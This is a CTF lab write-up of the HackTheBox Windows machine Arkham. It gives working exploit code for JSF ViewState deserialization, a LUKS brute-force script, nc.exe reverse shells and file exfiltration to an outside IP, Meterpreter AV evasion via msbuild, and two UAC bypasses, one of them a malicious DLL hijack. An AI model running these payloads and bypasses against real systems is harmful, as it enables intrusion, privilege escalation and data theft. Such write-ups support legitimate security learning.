---
title: "HackTheBox Writeup: Arkham"
date: 2019-08-22T19:37:20+02:00
tags:
  - hackthebox
  - ctf
  - writeup
---

![img](/images/arkham-writeup/1.png)

Arkham is one of my favorite boxes on HTB, I personally wouldn't have rated it as Medium but maybe it's just because it's the hardest Windows box I have faced so far, and it proved to be a lot of fun and a good way to learn more about Windows internals and post exploitation. Keep in mind that this is going to be a rather long writeup as I like showing all the steps and the thought process behind them. That being said, let's start from the very beginning: enumeration.

---

## Drawing the perimeter

The usual basic nmap scan with service enumeration (-sV) and execution of default NSE scripts (-sC) on all ports (-p-) returns a few ports that may be of our interest:

```
┌─[baud@parrot]─[~/arkham]
└──╼ $sudo nmap -sC -sV -p- -oA nmap 10.10.10.130
[sudo] password di baud:
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-07 19:19 CEST
Nmap scan report for 10.10.10.130
Host is up (0.025s latency).
Not shown: 65528 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8080/tcp  open  http          Apache Tomcat 8.5.37
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Mask Inc.
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -27s, deviation: 0s, median: -27s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-08-07 19:21:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.66 seconds
```

First of all, from the version of IIS running on port 80 (IIS 10.0) we can already tell we are dealing with either Windows Server 2016 or Windows 10, and opening the address http://10.10.10.130 on a browser shows a default unalterated installation of IIS:

![img](/images/arkham-writeup/2.png)

Running gobuster with a big dictionary doesn't return any results either so better focus somewhere else.

```
┌─[✗]─[baud@parrot]─[~/arkham]
└──╼ $gobuster dir -w ../SecLists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.130
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.130
[+] Threads:        50
[+] Wordlist:       ../SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/08/08 17:12:31 Starting gobuster
===============================================================
===============================================================
2019/08/08 17:12:46 Finished
===============================================================
┌─[baud@parrot]─[~/arkham]
└──╼ $
```

For example, there's a second web server running on port 8080, this time it's an Apache Tomcat server and there's an actual custom website:

![img](/images/arkham-writeup/3.png)

The website seems to be advertising a service called "Masks", name which is actually a hint on the technology behind this web application, in fact the only functional button on the website is the "Subscription" button, which redirects to this URL:


    http://10.10.10.130:8080/userSubscribe.faces

The .faces extension tells us this page relies on the Java Server Faces framework (JFS), possibly the Apache MyFaces implementation since this is an Apache server. JFS is a framework used to design web-based user interfaces, and on this site it's used to handle this simple subscription form:

![img](/images/arkham-writeup/4.png)

The button generates a POST request to the same page, sending the server not only the address we provide, but also a hidden input field that was in the HTML code, called "javax.faces.ViewState":

![img](/images/arkham-writeup/5.png)

With a little [research](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html) I discover that ViewState is a variable used by JFS to determine what components are supposed to be displayed on the page, and it's actually a serialized Java object which when not configured correctly can lead to RCE vulnerabilities. Because some implementations of JSF didn't encrypt or sign this ViewState string it is possible for an attacker to craft a malicious serialized Java object to send in place of the original, this object can use the Java gadgets available to the application to execute code.

Unfortunately for us, Apache MyFaces enables ViewState encryption by default using DES/ECB/PKCS5 Padding and even an SHA1 HMAC with a secret key to verify the validity of the data before it is decrypted server-side. If you're interested in knowing how all this works you'll find some Java pseudo-code later in this writeup or you can consult [the actual source code](https://www.programcreek.com/java-api-examples/?code=apache/myfaces-trinidad/myfaces-trinidad-master/trinidad-impl/src/main/java/org/apache/myfaces/trinidadinternal/util/StateUtils.java) responsible for encryption and decryption of the serialized object. Let's leave all this information on hold for some time and continue exploring the box.

All gobuster can find on this second web server is a bunch of resource folders that we cannot list:

```
/css
/favicons
/fonts
/images
/js
```

And excluding the two RPC ports I saved the most interesting one for last: SMB. Let's list the available shares using smbclient:

![img](/images/arkham-writeup/6.png)

Despite it containing "secrets" the BatShare folder is accessible without authentication and it contains a .zip file:

![img](/images/arkham-writeup/7.png)

```
smb: \> get appserver.zip
getting file \appserver.zip of size 4046695 as appserver.zip (1415,4 KiloBytes/sec) (average 1415,4 KiloBytes/sec)
smb: \> exit
┌─[baud@parrot]─[~]
└──╼ $file appserver.zip
appserver.zip: Zip archive data, at least v2.0 to extract
┌─[baud@parrot]─[~]
└──╼ $mv appserver.zip arkham/
┌─[baud@parrot]─[~]
└──╼ $cd arkham
┌─[baud@parrot]─[~/arkham]
└──╼ $unzip appserver.zip
Archive:  appserver.zip
   inflating: IMPORTANT.txt
   inflating: backup.img
┌─[baud@parrot]─[~/arkham]
└──╼ $
```

The IMPORTANT.txt file contains a note for Alfred from Bruce, anticipating us that backup.img is password protected:


    Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce

Now it's time for some trial and error. The easiest way to go past this obstacle is creating a subset of a big dictionary containing only Batman-related passwords to make our lives easier, I'm going to use rockyou.txt:


    $ cat /usr/share/wordlists/rockyou.txt | egrep 'batman|robin|alfred|joker|scarecrow|gotham' > wordlist.txt

This command creates a new wordlist with all the entries in rockyou.txt that contain the specified Batman-related words. This returns less than 6000 passwords, much less than having to deal with the whole huge original dictionary:

![img](/images/arkham-writeup/8.png)

Because these are still a lot of passwords it's necessary to automate the password guessing process. First let's check what kind of image file we are dealing with:

![img](/images/arkham-writeup/9.png)

Because it’s a LUKS file we can use the cryptsetup utility to work with it, and it comes really handy that it supports an option to verify passwords:

![img](/images/arkham-writeup/10.png)

Thanks to this a simple bash script can be written to bruteforce the file:

```
# read a line from the wordlist
cat wordlist.txt | while read i; do
echo -ne "\rTrying: \"$i\""\\r
# pass the current password attempt to cryptsetup (the .img file is passed from stdin)
echo $i | cryptsetup luksOpen $1 x --test-passphrase -T1 2>/dev/null
# grab cryptsetup's exit code
STATUS=$?
# was the operation successful?
if [ $STATUS -eq 0 ]; then
	echo -e "\nPASSWORD FOUND: \"$i\""
	break
	fi
	done
```

The script is a little slow but it does the job and the password is found:
	
	┌─[root@parrot]─[/home/baud/arkham]
	└──╼ #./luksBrute.sh backup.img
	Trying: "batman"
	Trying: "alfredo"
	Trying: "alfred"
	Trying: "robinson"
	Trying: "batman1"
	Trying: "joker"
	Trying: "robin"
	[....]
	PASSWORD FOUND: "batmanforever"
	
cryptsetup automatically mapped the image file on to /dev/mapper/x so it needs to be mounted:
	
	┌─[root@parrot]─[/home/baud/arkham]
	└──╼ # mkdir /mnt/arkham
	┌─[root@parrot]─[/home/baud/arkham]
	└──╼ # mount /dev/mapper/x /mnt/arkham
	┌─[root@parrot]─[/home/baud/arkham]
	└──╼ # ls -la /mnt/arkham/
	totale 14
	drwxr-xr-x 4 root root  1024 dic 25  2018 .
	drwxr-xr-x 1 root root    38 ago  7 19:23 ..
	drwx------ 2 root root 12288 dic 25  2018 lost+found
	drwxrwxr-x 4 root root  1024 dic 25  2018 Mask
	
lost+found is empty but Mask contains MyFaces configuration files, other than a few random images which don't contain anything interesting and have nothing to hide:
		
	┌─[root@parrot]─[/mnt/arkham]
	└──╼ #ls -ls Mask
	totale 880
	1 drwxr-xr-x 2 root root   1024 dic 25  2018 docs
	95 -rw-rw-r-- 1 root root  96978 dic 25  2018 joker.png
	103 -rw-rw-r-- 1 root root 105374 dic 25  2018 me.jpg
	672 -rw-rw-r-- 1 root root 687160 dic 25  2018 mycar.jpg
	8 -rw-rw-r-- 1 root root   7586 dic 25  2018 robin.jpeg
	1 drwxr-xr-x 2 root root   1024 dic 25  2018 tomcat-stuff
	┌─[root@parrot]─[/mnt/arkham]
	└──╼ #ls -la Mask/tomcat-stuff
	totale 193
	drwxr-xr-x 2 root root   1024 dic 25  2018 .
	drwxrwxr-x 4 root root   1024 dic 25  2018 ..
	-rw-r--r-- 1 root root   1368 dic 25  2018 context.xml
	-rw-r--r-- 1 root root    832 dic 25  2018 faces-config.xml
	-rw-r--r-- 1 root root   1172 dic 25  2018 jaspic-providers.xml
	-rw-r--r-- 1 root root     39 dic 25  2018 MANIFEST.MF
	-rw-r--r-- 1 root root   7678 dic 25  2018 server.xml
	-rw-r--r-- 1 root root   2208 dic 25  2018 tomcat-users.xml
	-rw-r--r-- 1 root root 174021 dic 25  2018 web.xml
	-rw-r--r-- 1 root root   3498 dic 25  2018 web.xml.bak
	
If you're wondering, docs contains the scripts of Batman Begins. Confused? So am I. But here's something very interesting to break the confusion, by taking a look at the configuration files I discover the encryption settings used by the server:

![img](/images/arkham-writeup/11.png)

Now that I know the secret keys used by the web application to encrypt and decrypt the ViewState object I can send my own malicious objects to achieve RCE.

---

## A bit of cryptography

I took a look at the MyFaces code to see how it works out of curiosity and altered it a bit to get rid of stuff I don't need and to make it more readable, this is the function responsible for encrypting objects:

```java
public static byte[] encrypt(byte[] insecure, ExternalContext ctx)
{
	// no IV by default
	byte[] iv = null;
	// create the mac object
	Mac mac = Mac.getInstance("HmacSHA1");
	// give it the secret key
	mac.init("SnNGOTg3Ni0=");
	// declare the output cihper
	Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
	// initialize it with the secret key
	cipher.init(Cipher.ENCRYPT_MODE, "SnNGOTg3Ni0=");
	// SHA1 output = 20 bytes
	int macLenght = mac.getMacLength();
	// this array of bytes will contain the encrypted data. The mac is appeneded to it
	byte[] secure = new byte[cipher.getOutputSize(insecure.length) + macLenght];
	// encrypt data "insecure" and store the cipher in "secure"
	int secureCount = cipher.doFinal(insecure, 0, insecure.length, secure);
	// update the mac with the current params: source buffer, offset, amount of bytes
	mac.update(secure, 0, secureCount);
	// and then calculate it
	mac.doFinal(secure, secureCount);
	return secure;
}
```

And this one decrypts them:

```java
public static byte[] decrypt(byte[] secure, ExternalContext ctx)
{
	// no IV by default
	byte[] iv = null;
	// create the mac object
	Mac mac = Mac.getInstance("HmacSHA1");
	// give the object the secret key
	mac.init("SnNGOTg3Ni0=");
	// create a DES cipher for the decryption process
	Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
	// initialize the cipher for decryption with the secret key
	cipher.init(Cipher.DECRYPT_MODE, "SnNGOTg3Ni0=");
	// SHA1 output = 20 bytes
	int macLenght = mac.getMacLength();
	// calculate the mac from the received data
	mac.update(secure, 0, secure.length-macLenght);
	byte[] signedDigestHash = mac.doFinal();
	boolean isMacEqual = true;
	// check if the received mac has been calculated with the correct key
	for (int i = 0; i < signedDigestHash.length; i++)
	{
		if (signedDigestHash[i] != secure[secure.length-macLenght+i])
		{
			isMacEqual = false;
		}
	}
	// if the two macs are equal the message is decrypted
	return cipher.doFinal(secure, 0, secure.length-macLenght);
}
```

The way it works is the serialized Java object is made of DES encrypted data with the HMAC used for verification appended at the end, it being the last 20 bytes. This structure is then encoded in Base64 and it’s what we saw earlier on Burp. The HMAC is used to calculate a message digest using the encrypted data and the secret key, when the server receives the ViewState object back it will first calculate a new HMAC from the data it received and the key stored in the settings, if it’s the same as the HMAC appended to the data then the data can be trusted and it is finally deserialized. Now that we have that secret key we can use it to calculate our own valid HMACs, allowing us to achieve RCE because our objects will look 100% legit.

---

## Exploitation: blind shell through deserialization flaw

By exploiting this flaw we'll be able to execute arbitrary Java gadgets that when chained together can perform several tasks, but because we're not executing OS commands from the start we need a third party program to generate these chains for us and serialize them, for this purpose I downloaded [ysoserial](https://github.com/frohoff/ysoserial) and used the CommonsCollections5 gadgets to execute cmd.exe on the system. ysoserial returns the serialized object on stdout so we can write a Python script that grabs the output from ysoserial and forwards it to the server after encrypting it properly and appending the correct HMAC to it:

```python
import base64
import hashlib
import urllib
import hmac
import pyDes
import sys
import requests
import subprocess

# generate the serialized Java object
def getPayload(cmd):
p = subprocess.Popen('java -jar /home/baud/arkham/ysoserial.jar CommonsCollections5 "'+cmd+'"', stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
payload = p.stdout.read()

# encrypt the object with DES
secret = bytes(base64.b64decode("SnNGOTg3Ni0="))
des_obj = pyDes.des(secret, pyDes.ECB, IV=None, padmode=pyDes.PAD_PKCS5)
encrypted_payload = des_obj.encrypt(payload)

# calculate the HMAC
mac_obj = hmac.new(secret, encrypted_payload, hashlib.sha1)
mac = mac_obj.digest()

# return [encrypted_data + HMAC]
out = base64.encodestring(encrypted_payload + mac)
out = out.replace('\n', '').replace('\r', '')
return out

# ask for the command to be executed
while True:
	cmd = raw_input("> ")
	if cmd == 'exit':
		sys.exit(0)
		
		# send a POST request to the server with our newly crafted ViewState object
		url = "http://10.10.10.130:8080/userSubscribe.faces"
		cookies = {"JSESSIONID": "38D5C0F7EAC7A6F06299275C268986BB"}
		req_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"}
		req_data={"j_id_jsp_1623871077_1:email": "baudy@baud.com", "j_id_jsp_1623871077_1:submit": "SIGN UP", "j_id_jsp_1623871077_1_SUBMIT": "1"}
		data['javax.faces.ViewState'] = getPayload(cmd)
		r = requests.post(url, cookies=cookies, data=req_data, headers=req_headers)
```

This script gives us a blind shell on the box, we are able to execute any operation we want but it's still uncomfortable, and blind, so to have a proper shell I downloaded nc.exe on the box using Invoke-WebRequest:

```
┌─[root@parrot]─[/home/baud/server]
└──╼ # php -S 0.0.0.0:9090 -t .
┌─[root@parrot]─[/home/baud/arkham]
└──╼ # nc -lvnp 9999
```

```
> powershell iwr http://10.10.14.29:9090/nc.exe -OutFile ./nc.exe
> nc.exe -e cmd 10.10.14.29 9999
```

![img](/images/arkham-writeup/12.png)

With this we finally have a shell as Alfred and can read our first flag, then it's time for some local enumeration. Aside from Alfred and Administrator there's another user on the system: Batman. Unfortunately his directory is out of our reach.

![img](/images/arkham-writeup/13.png)

---

## Horizontal privilege escalation: becoming Batman

Inside Alfred's downloads directory there's a backups folder containing a backup.zip file, because I'm lazy and meterpreter executables are immediately detected by an angry Defender I'm going to use nc.exe to transfer this file locally:

```
# On Arkham:
nc.exe 10.10.14.29 4444 < c:\users\alfred\downloads\backups\backup.zip
# On local box:
nc -lvp 4444 > backup.zip
```
![img](/images/arkham-writeup/14.png)

After unzipping the file it turns out the content is a .ost file, so an Outlook mail archive, so to say. On Linux we can open it using readpst and it will extract the emails it finds:

![img](/images/arkham-writeup/15.png)

The only email it found was in the Drafts folder and we can read it by catting the Drafts file created by readpst. The mail contains an image as attachment which is encoded in Base64 and the body of the message tells us this email was supposed to be sent to Master Wayne because he keeps forgetting his password:

![img](/images/arkham-writeup/16.png)

Convert the attachment back to .png and the result is this:

![img](/images/arkham-writeup/17.png)

Not only this picture gives us the Batman account's password, it also gives us a big hint on one of the two ways we have to get root. So now we have a new pair of credentials:

```
User: batman
Pass: Zx^#QZX+T!123
```

There are no services such as RDP or SSH running on the box so we cannot log in as Batman from the outside, but we can do it through a [PSSession](https://www.sconstantinou.com/windows-powershell-sessions-pssessions/):

```
$pw = ConvertTo-SecureString -string "Zx^#QZX+T!123" -AsPlainText -force;
$pp = new-object -typename System.Management.Automation.PSCredential -ArgumentList "ARKHAM\batman", $pw;
Enter-PSSession -ComputerName localhost -Credential $pp
```

![img](/images/arkham-writeup/18.png)

Once in the PSSession we must follow the following syntax in order to run cmd commands:

    Invoke-Command -ScriptBlock { command }

This is very tedious to write every time so we can bypass this obstacle by using the nc.exe executable we uploaded earlier to start a normal cmd shell on another port:

    Invoke-Command -ScriptBlock {C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9797 -e cmd.exe}

![img](/images/arkham-writeup/19.png)

Now we can start investigating the system further. Batman's home folder doesn't contain anything so what's the purpose in using this account? Well, apparently Batman is actually part of the Administrators group:

![img](/images/arkham-writeup/20.png)

But trying to access the Administrator folder still results in an access denied error:

![img](/images/arkham-writeup/21.png)

This is because UAC is enabled and doesn't allow us to use Administrator privileges, we'd need to be in an interactive desktop and click "Yes" on the UAC prompt in order to execute commands that require Administrator permissions.

---

## Getting root - the easy way (net use)

I said that the attachment picture is a clear hint of a way to grab the root flag because we can use the same utility shown in Alfred's screenshot to access it. Because we are already administrators with this account we can use net use and mount the administrator's folder (or the whole drive) on to another drive and we'll be able to access it without UAC getting in the way:

    $ net use * "\\arkham\users\administrator\desktop" /persistent:no

![img](/images/arkham-writeup/22.png)

---

## Getting root - the real men's way (UAC bypass)

There are a few currently unpathced UAC bypasses for Windows 10, I tried these two: 

1. https://egre55.github.io/system-properties-uac-bypass/
+ https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html

And I'm going to demonstrate egre55's method because in my opinion it's more fun, even if a little longer. This method abuses the fact that some executables can bypass the UAC prompt thanks to a property found inside the executable's manifest: "<autoElevate>true". This allows certain programs to be granted administrator privileges without a UAC prompt. Egre55 found that some of the programs with this property are vulnerable to DLL hijacking and crafting a malicious DLL allows us to execute arbitrary code bypassing UAC. These are the vulnerable programs:

```
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
C:\Windows\SysWOW64\SystemPropertiesComputerName.exe
C:\Windows\SysWOW64\SystemPropertiesHardware.exe
C:\Windows\SysWOW64\SystemPropertiesProtection.exe
C:\Windows\SysWOW64\SystemPropertiesRemote.exe
```

They all try to load a library called srrstr.dll from AppData/Local/Microsoft/WindowsApps/, folder which is present in the PATH environment variable and can be written to by normal users:

![img](/images/arkham-writeup/23.png)

If we drop a malicious srrstr.dll file in that folder and start one of those programs our code will be executed with elevated privileges. Before we do that we must make sure our shell is in an interactive process, otherwise it won't work. To do this we need a Meterpreter shell but because Defender will find and delete all default Meterpreter payloads there's also a bit of AV evasion involved that I'll solve with [GreatSCT](https://github.com/GreatSCT/GreatSCT). To be more specific I'll be launching Meterpreter via the "msbuild method", read more about it [here](https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/). Other useful AV evasion solutions that could work in this instance are [Veil](https://github.com/Veil-Framework/Veil), [Phantom Evasion](https://github.com/oddcod3/Phantom-Evasion), [nps_payload](https://github.com/trustedsec/nps_payload) and [Ebowla](https://github.com/Genetic-Malware/Ebowla).

These are the steps to generate the payload using GreatSCT:

```
> use Bypass
> use msbuild/meterpreter/rev_tcp.py
> set LHOST 10.10.14.29
> set LPORT 9292
> generate
```

GreatSCT will create two different files for us:

![img](/images/arkham-writeup/24.png)

payload.xml will be msbuild's input, while payload.rc is a Metasploit resource file to be opened by msfconsole either with the -r flag or the resource command, and will start a multi handler for us. So let's download the xml file on Arkham (again with Invoke-WebRequest or "iwk" for short) and then launch msbuild.exe by specifing its absolute path since it's not in %path%:


    C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe msbuild.xml

![img](/images/arkham-writeup/25.png)

The handler in the meantime catches the incoming connection and starts a Meterpreter session:

![img](/images/arkham-writeup/26.png)

Now we can list running processes with ps and select an interactive one (so one with a GUI) to migrate to, explorer.exe is a good example:

![img](/images/arkham-writeup/27.png)

Now it's time to craft a DLL. Mine will just start a reverse shell with the same nc.exe we've been using over and over again, here's the C++ code:

```cpp
#include <windows.h>

void exploit(void);

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
		case DLL_PROCESS_ATTACH:
			exploit();
	}
	return TRUE;
}

void exploit(void)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	char cmd[] = "C:\\tomcat\\apache-tomcat-8.5.37\\bin\\nc.exe -e cmd 10.10.14.29 5555";
	
	CreateProcess(NULL,    // No module name (use command line)
	cmd,            // Command line
	NULL,           // Process handle not inheritable
	NULL,           // Thread handle not inheritable
	FALSE,          // Set handle inheritance to FALSE
	0,              // No creation flags
	NULL,           // Use parent's environment block
	NULL,           // Use parent's starting directory
	&si,            // Pointer to STARTUPINFO structure
	&pi );          // Pointer to PROCESS_INFORMATION structure
	
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	ExitThread(0);
}
```

If you're interested in knowing more about how it works I suggest reading these two pages: [DllMain](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain), [CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa). I compiled it using mingw32:

```
┌─[baud@parrot]─[~/arkham]
└──╼ $i686-w64-mingw32-gcc -shared -o srrstr.dll srrstr.cpp -l ws2_32
```

Note: if anyone knows why only the code compiled with i686-w64-mingw32-gcc works on the box and not with x86_64-w64-mingw32-gcc please let me know, because I'm a little confused.  Anyway, drop the DLL in the WindowsApps folder, launch one of the vulnerable programs, and a shell is spawned:

![img](/images/arkham-writeup/28.png)

![img](/images/arkham-writeup/29.png)

Note that the full path of the program must be specified, this is necessary because there are two different copies of the program on the disk, one in System32 and the other in SysWOW64, apparently the attack only works with the second executable.

The second UAC bypass is easy to pull off as well, it consinsts in downloading a [C# source file](https://github.com/0xVIC/UAC/blob/master/SendKeys_technique.cs), compiling it as a DLL on Arkham, loading the DLL into memory from PS, and calling the bypass function from the DLL by giving it a command to run which will inherit higher privileges. [Here](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/) is explained the bypass that the DLL exploits, which relies on a binary called CMSTP.exe:

```
# download the file locally:
Invoke-WebRequest "http://10.10.14.29:9090/bypass.cs" -outfile "./Source.cs"
# compile it as a DLL:
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
# load the newly compiled DLL into memory:
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
# get a reverse shell using nc:
[CMSTPBypass]::Execute("C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9898 -e cmd.exe")
```
[(source)](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)

This was Arkham, one of the most fun and instructive boxes I’ve done so far. Thank you for reading, I hope you found this post useful.


This post was originally published on [0x00sec](https://0x00sec.org/t/hackthebox-writeup-arkham/15541).












